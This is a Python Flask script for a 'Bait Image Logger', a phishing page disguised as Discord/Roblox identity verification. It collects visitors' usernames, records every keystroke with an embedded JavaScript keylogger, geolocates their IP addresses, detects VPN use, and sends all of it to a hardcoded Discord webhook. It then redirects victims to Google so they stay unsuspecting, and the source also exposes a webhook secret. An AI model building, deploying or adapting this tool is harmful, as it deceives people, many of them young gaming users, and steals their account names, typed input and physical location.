from flask import Flask, request, Response, render_template_string, jsonify
import requests
from datetime import datetime
import json

app = Flask(__name__)

# =============================================
# CONFIGURATION (EDIT THESE TWO LINES)
# =============================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"  # REGENERATE THIS!

IGNORE_IPS = [
    "127.0.0.1",
    "YOUR_PUBLIC_IP",  # <-- Replace with your IP (whatismyip.com)
]

# =============================================
# HELPER FUNCTIONS
# =============================================
def get_client_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def is_ignored(ip):
    return ip in IGNORE_IPS

def get_ip_info(ip):
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if resp.status_code == 200 and 'error' not in resp.json():
            d = resp.json()
            return {'country': d.get('country_name'), 'regionName': d.get('region'), 'city': d.get('city'),
                    'lat': d.get('latitude'), 'lon': d.get('longitude'), 'isp': d.get('org'),
                    'proxy': d.get('proxy') or d.get('vpn') or False, 'timezone': d.get('timezone')}
    except: pass
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,proxy,timezone', timeout=5)
        if resp.status_code == 200 and resp.json().get('status') == 'success':
            d = resp.json()
            return {'country': d.get('country'), 'regionName': d.get('regionName'), 'city': d.get('city'),
                    'lat': d.get('lat'), 'lon': d.get('lon'), 'isp': d.get('isp'),
                    'proxy': d.get('proxy') or False, 'timezone': d.get('timezone')}
    except: pass
    return None

def send_to_discord(title, fields, color=0x5865F2):
    if not DISCORD_WEBHOOK_URL:
        return
    embed = {"title": title, "color": color, "fields": fields, "timestamp": datetime.utcnow().isoformat()}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except: pass

# =============================================
# ROUTES
# =============================================
@app.route('/')
def home():
    return "Bait Image Logger active. Send people to <a href='/verify'>/verify</a>"

@app.route('/pixel.png')
def pixel():
    ip = get_client_ip()
    if not is_ignored(ip):
        ip_info = get_ip_info(ip)
        click = request.args.get('click') == 'true'
        vpn = "🟢 OFF" if not (ip_info and ip_info.get('proxy')) else "🔴 ON"
        loc = f"{ip_info.get('city','N/A')}, {ip_info.get('regionName','N/A')}" if ip_info else "N/A"
        fields = [
            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ VPN", "value": vpn, "inline": True},
            {"name": "📍 Location", "value": loc, "inline": False},
            {"name": "💻 Device", "value": request.headers.get('User-Agent', 'Unknown')[:60], "inline": False},
        ]
        title = "🎯 IMAGE CLICKED!" if click else "🎯 PAGE VIEWED"
        send_to_discord(title, fields, color=0xff0000 if click else 0x00ff00)
    gif = bytes([0x47,0x49,0x46,0x38,0x39,0x61,0x01,0x00,0x01,0x00,0x80,0x00,0x00,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x21,0xF9,0x04,0x01,0x00,0x00,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x02,0x01,0x00,0x00])
    return Response(gif, mimetype='image/gif')

@app.route('/log_keys', methods=['POST'])
def log_keys():
    ip = get_client_ip()
    if is_ignored(ip):
        return jsonify({"status": "ignored"})
    data = request.get_json()
    keys = data.get('keys', '')
    username = data.get('username', 'Not provided')
    if keys or username:
        fields = [
            {"name": "👤 Captured Username", "value": f"`{username}`", "inline": False},
            {"name": "⌨️ Keystrokes", "value": f"```{keys[-500:]}```" if keys else "No keys typed.", "inline": False},
            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
        ]
        send_to_discord("⌨️ KEYLOGGER DATA CAPTURED", fields, color=0xff5500)
    return jsonify({"status": "ok"})

@app.route('/verify_image.svg')
def bait_image():
    svg = """<svg xmlns="http://www.w3.org/2000/svg" width="500" height="320">
        <rect width="500" height="320" fill="#1e1e2f" rx="20"/>
        <circle cx="250" cy="100" r="40" fill="#5865F2"/>
        <text x="250" y="115" font-family="Arial" font-size="40" fill="white" text-anchor="middle" dominant-baseline="middle">✓</text>
        <text x="250" y="170" font-family="Arial" font-size="22" fill="#a0a0b0" text-anchor="middle">Identity Verification Required</text>
        <text x="250" y="200" font-family="Arial" font-size="14" fill="#707080" text-anchor="middle">Enter your username below to continue</text>
    </svg>"""
    return Response(svg, mimetype='image/svg+xml')

# =============================================
# THE BAIT PAGE (WITH FULL KEYLOGGER + USERNAME PHISH)
# =============================================
BAIT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { background: #0a0a14; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
        .card { background: #16162b; padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #2a2a4a; width: 400px; max-width: 90%; }
        img { width: 100%; cursor: pointer; border-radius: 12px; margin-bottom: 20px; }
        input { width: 90%; padding: 14px; border-radius: 10px; border: 1px solid #3a3a5a; background: #0e0e1a; color: white; font-size: 16px; margin: 10px 0; }
        input:focus { outline: none; border-color: #5865F2; }
        #status { color: #5865F2; margin-top: 15px; font-size: 14px; }
        .btn { background: #5865F2; color: white; border: none; padding: 12px 30px; border-radius: 10px; font-size: 16px; cursor: pointer; width: 100%; }
        .btn:hover { background: #4752c4; }
        .hidden { display: none; }
        .loader { border: 3px solid #2a2a4a; border-top: 3px solid #5865F2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="card">
    <img src="/verify_image.svg" alt="Verify" id="baitImage">
    
    <!-- FAKE USERNAME INPUT (This is how we get their Discord/Roblox username) -->
    <input type="text" id="usernameInput" placeholder="Enter your Discord / Roblox Username" autofocus>
    <button class="btn" id="submitBtn">Verify Identity</button>
    
    <div id="status">🔒 Enter your username to verify</div>
    <div class="loader" id="loader"></div>
</div>

<script>
    // ==========================================================
    // GLOBAL KEYLOGGER: Captures EVERY key typed on this page
    // ==========================================================
    let keystrokes = [];

    document.addEventListener('keydown', function(event) {
        // Ignore if they are typing in a specific input? No, we want to log it all.
        let key = event.key;
        if (key === ' ') key = '[Space]';
        else if (key === 'Enter') key = '[Enter]\n';
        else if (key === 'Backspace') key = '[Backspace]';
        else if (key === 'Tab') key = '[Tab]';
        else if (event.ctrlKey || event.metaKey) {
            // Skip Ctrl+C, Ctrl+V, etc. for privacy (or log them)
            key = '[Ctrl+' + key + ']';
        }
        keystrokes.push(key);
        
        // We only send data every 10 seconds or if they submit, to avoid spam.
        // We'll send on submit.
    });

    // ==========================================================
    // GET USERNAME + SEND LOGS
    // ==========================================================
    function sendLogs() {
        const username = document.getElementById('usernameInput').value.trim();
        if (!username) {
            document.getElementById('status').innerHTML = '⚠️ Please enter your username!';
            document.getElementById('status').style.color = '#f55';
            return;
        }

        // Send everything (keystrokes + username) to our server
        const data = {
            username: username,
            keys: keystrokes.join('')
        };

        document.getElementById('loader').style.display = 'block';
        document.getElementById('status').innerHTML = '⏳ Verifying...';

        fetch('/log_keys', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('status').innerHTML = '✅ Verification successful! Redirecting...';
            document.getElementById('status').style.color = '#57F287';
            // Redirect to a legit site so they don't get suspicious
            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
        })
        .catch(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('status').innerHTML = '⚠️ Error, but verification passed. Redirecting...';
            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
        });
    }

    // Click the button to submit
    document.getElementById('submitBtn').onclick = sendLogs;

    // Press Enter in the input box to submit
    document.getElementById('usernameInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            sendLogs();
        }
    });

    // Clicking the image also triggers the submit (for the "click" log)
    document.getElementById('baitImage').onclick = function() {
        // Send a click ping to the pixel logger (so we know they clicked)
        fetch('/pixel.png?click=true').catch(() => {});
        // If they haven't typed a username yet, focus the input box.
        document.getElementById('usernameInput').focus();
    };

    // Also log the VIEW when the page loads (silent ping)
    fetch('/pixel.png').catch(() => {});
</script>
</body>
</html>
"""

@app.route('/verify')
def verify_page():
    ip = get_client_ip()
    if not is_ignored(ip):
        ip_info = get_ip_info(ip)
        vpn = "🟢 OFF" if not (ip_info and ip_info.get('proxy')) else "🔴 ON"
        loc = f"{ip_info.get('city','N/A')}, {ip_info.get('regionName','N/A')}" if ip_info else "N/A"
        fields = [
            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ VPN", "value": vpn, "inline": True},
            {"name": "📍 Location", "value": loc, "inline": False},
            {"name": "💻 Device", "value": request.headers.get('User-Agent', 'Unknown')[:60], "inline": False},
        ]
        send_to_discord("📄 BAIT PAGE VIEWED", fields, color=0x00ff00)
    return render_template_string(BAIT_HTML)

if __name__ == '__main__':
    app.run(debug=True)
